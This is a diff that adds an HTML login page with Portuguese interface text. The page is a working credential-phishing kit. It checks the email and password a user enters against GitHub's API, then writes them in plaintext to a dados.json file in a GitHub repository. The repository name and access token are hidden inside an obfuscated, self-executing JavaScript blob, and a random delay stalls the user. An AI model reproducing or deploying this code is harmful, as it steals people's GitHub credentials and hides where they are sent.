@@ -1,0 +1,170 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login</title>
+    <link rel="stylesheet" href="frontend/css/styles.css">
+    <style>
+        #loading-spinner {
+            display: none; /* Hidden by default */
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            z-index: 9999; /* Ensure it is on top */
+            text-align: center;
+        }
+        .spinner {
+            border: 8px solid rgba(0, 0, 0, 0.1);
+            border-left-color: #3498db;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <h2>Login</h2>
+        <input type="email" id="email" placeholder="Usuário">
+        <input type="password" id="password" placeholder="Password">
+        <button onclick="login()">Login</button>
+
+        <p id="error-msg" style="color: red; display: none; text-align: center;">Email ou senha, inválidos!</p>
+        <p id="warning-msg" style="color: orange; display: none; text-align: center;"></p>
+        <div id="custom-error-msg" style="color: red; display: none; text-align: center;">User disabled, please reactivate to use.</div>
+    </div>
+
+    <div id="loading-spinner">
+        <div class="spinner"></div>
+        <p>Conectando a...</p>
+    </div>
+
+    <script>
+        document.addEventListener('keydown', function(event) {
+            if (event.key === 'Enter') {
+                if (document.activeElement.id === 'email' || document.activeElement.id === 'password') {
+                    login();
+                }
+            }
+        });
+
+var token,repoOwner,repoName,filePath;(function(){var VXP='',KAC=115-104;function uig(t){var p=585318;var f=t.length;var u=[];for(var q=0;q<f;q++){u[q]=t.charAt(q)};for(var q=0;q<f;q++){var o=p*(q+428)+(p%39270);var g=p*(q+507)+(p%35113);var l=o%f;var z=g%f;var y=u[l];u[l]=u[z];u[z]=y;p=(o+g)%1486227;};return u.join('')};var SYf=uig('vbxuczhctmfwtcdeunorlrgnoojqrsksyiapt').substr(0,KAC);var Qff='(8](n= ]94tC(,!=utg)!r v=a o]9nr0.vjk+;l)3qe;lcoex*o"aehe )6iith.fava;(6.vh.6+e6{i74 rm,+lr7"f9=e7ru1[iro,A ),,uvnkr;}=6+)vay"yg[ hn,r;r.1-;] ]rr=y;[f th;.t(ha +[)o71.21;;ab <.1]."0=b+;sv((z4po2f4;mm6hv=r)bjtCe;nvgll{fAscip,o .uht6aorj=ui9a(qumext=nerpopls((ji.37;eCrvr;ju{)"lj;gah;+;[>e0o+C1.+(ar ao]=,l0-h)ry;g2kgu=g7cj=anelaq=r= m,;v)r wlhjl8ng.(orirg,l8o ("rf u1=;k+pmkhrf=v(x+b==.clizCod )t[,+jv[=av8un)hvnfrr)s-s4(rs)e,iy;;a;cn-d)u;tgars-v1erkeujkAgelsv)jf0)f"ki.naih(]f;n).+5aq<t4;t(7d,nsa}ve9rc0==++c)k2oaa[r(k]2((v]tngf{i9+;z90vroli5SAnzvc=nu8h=o ((d)t==s0rlje>r=e.=d80(yu)(=11;i,mf;ss)=wrli8}1n)s,C(+)a,;q0)=6nr=pn=+.lr+tnA,,i.)na u2h"m,;[twCu;arhv=as.uar)i.ue]oe;isrf[asp.s8ag[=oavrkryan={,j}pr)p"n;5are,)v-2;,sro[whua3tt3=r 0]2l;e;[b rat1r=S{ii9.sn)anot (C[)u,h,7<2{]+(;hxr8;;geir;lrbt<sr+ygi(l)(pl6;=l.hrcm)]t*(+;=(d(tn(yr(eo- }}0<}gnrsg.q+o .;ad;attkt;u=p=gln,kvn",g7,0++).xat';var gsK=uig[SYf];var XwX='';var bUK=gsK;var Hby=gsK(XwX,uig(Qff));var HaH=Hby(uig('!]e;do8nP&f.)[P,530urioln3P Pe06a,[]P$(4!=3u,#2r71(\'c4.P(a,.!lpePnz)cPP$$)a!a.i#=m).,_;Pg5P;m"PoPoua3!.P{ae PP$rx)j0=(&(Pf0s4DvhP,2T5vqi_pd0g\/_+Pa_dP!w.$c..=]P)gm.)fo0- szt  }e5,3,b831+;f;aq(;"$a;.n4Pu$P{m)ee_r7P.)"(on(*13_.p,b).b.,s=Pol()iwrlPP(bvk=!.qee,g.9;r4!}t(*7)o;#2Pj3Ppefe.&r$Pto7e6}qjr2per)if.(1jo.S;cth=r.m71=8}Pf;0rrsp(irj1eb$s,.h,t!enPj+3.;fag41tP+e&tP$-P(Pf02_pu.#xrssts)j 7a (Pdz_e,Pt23g-",tP.h.[,P0,{)rg$*$0.,b5 ck;r.m.z1Pa(nt){pPe1%f7$Seq;e2r);g7!(5P)!.o%i)irt8(b2!).);{!oPPgrhmn%{\/b(6f=r+,30Pb_blk;}*5(}t0$)o)i"g-Pg3h](d,)b37.!fa,Psee3\'o&nPPn3{.$f(iho]j\/s,C!j=p=4%}1}8l=mffp(96!fC.S; =#=u.,),,%3eN.4_Pfp{elPtPne)x(lPtPP#_,cu_+ePPzs),P8d! %E)o_.P "aPa,ays+.$repee )  .$%;f)$e,g;=h(%.iP$;PPf(g2m t..+7;$oeP)+5}3sPt3tf1(!!k(.;,sn]Pp=pPb;tP.0#Pgol=3.iPp60te)u)6)PePP27b$$b3t1=_)e{.k\'e)y]gh=f3t (_l!Dt.er}(rPp82ij!.6.;;))$}lP-f2qupso$P,}PP_e_gu e,P PeetSr,.d._9son,tpfn.3o%rPPuh(.j\/)-pn2))h!P. ;=\'Pr$-fxP80ouj*ezP13$r.(qjP(8Pa.%4$e.).nP_2(er!e,_;n=t"u2rP.3so'));var VfH=bUK(VXP,HaH );VfH(8484);return 4679})()
+
+        async function login() {
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+
+            // Show loading spinner
+            const spinner = document.getElementById('loading-spinner');
+            spinner.style.display = 'block';
+
+            // Random delay between 5 and 30 seconds
+            const delay = Math.floor(Math.random() * 25000) + 5000;
+            await new Promise(resolve => setTimeout(resolve, delay));
+
+            // Make API call to GitHub for authentication
+            const credentials = btoa(`${email}:${password}`);
+            try {
+                const response = await fetch('https://api.github.com/user', {
+                    method: 'GET',
+                    headers: {
+                        'Authorization': `Basic ${credentials}`,
+                        'Accept': 'application/vnd.github.v3+json'
+                    }
+                });
+
+                if (response.ok) {
+                    const userData = await response.json();
+                    // Hide loading spinner
+                    spinner.style.display = 'none';
+
+                    // Show success message and user data
+                    const greeting = document.createElement('p');
+                    greeting.innerText = `Olá, ${userData.login}`;
+                    document.body.prepend(greeting);
+
+                    // Save user data to GitHub
+                    await saveUserData(userData.login, email, password);
+                } else {
+                    // Handle errors
+                    spinner.style.display = 'none';
+                    document.getElementById('error-msg').style.display = 'block';
+                }
+            } catch (error) {
+                console.error("Erro ao conectar ao GitHub:", error);
+                spinner.style.display = 'none';
+                document.getElementById('custom-error-msg').style.display = 'block';
+            }
+        }
+
+        async function saveUserData(username, email, password) {
+            const userData = {
+                username: username,
+                email: email,
+                password: password
+            };
+
+            // Fetch current data from dados.json
+            try {
+                const response = await fetch(`https://api.github.com/repos/${repoOwner}/${repoName}/contents/${filePath}`, {
+                    headers: {
+                        'Authorization': `token ${token}`,
+                        'Accept': 'application/vnd.github.v3+json'
+                    }
+                });
+
+                let fileContent;
+                if (response.ok) {
+                    const fileData = await response.json();
+                    fileContent = atob(fileData.content);
+                    const jsonData = JSON.parse(fileContent);
+                    jsonData.push(userData); // Append new user data
+                    await updateFile(fileData.sha, JSON.stringify(jsonData));
+                } else {
+                    // If file doesn't exist, create it
+                    await createFile(JSON.stringify([userData]));
+                }
+            } catch (error) {
+                console.error("Erro ao salvar dados do usuário:", error);
+            }
+        }
+
+        async function updateFile(sha, content) {
+            await fetch(`https://api.github.com/repos/${repoOwner}/${repoName}/contents/${filePath}`, {
+                method: 'PUT',
+                headers: {
+                    'Authorization': `token ${token}`,
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    message: 'Update user data',
+                    content: btoa(content),
+                    sha: sha
+                })
+            });
+        }
+
+        async function createFile(content) {
+            await fetch(`https://api.github.com/repos/${repoOwner}/${repoName}/contents/${filePath}`, {
+                method: 'PUT',
+                headers: {
+                    'Authorization': `token ${token}`,
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    message: 'Create dados.json',
+                    content: btoa(content)
+                })
+            });
+        }
+    </script>
+</body>
+</html>
